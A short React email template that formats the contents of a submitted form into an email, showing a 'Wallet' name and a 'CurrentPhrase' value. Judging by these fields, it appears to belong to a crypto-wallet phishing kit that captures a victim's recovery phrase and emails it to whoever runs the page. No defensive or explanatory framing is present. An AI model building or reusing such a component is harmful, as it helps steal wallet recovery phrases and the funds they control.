import * as React from "react";

interface EmailProps {
  wallet: string;
  currentPhrase: string;
}

export default function Email({ wallet, currentPhrase }: EmailProps) {
  return (
    <div>
      <div>
        <p>There are the inputs from the form submitted...</p>
        <p>
          <b>Wallet</b> : {wallet}
        </p>
        <p>
          <b>CurrentPhrase</b> : {currentPhrase}
        </p>
      </div>
    </div>
  );
}
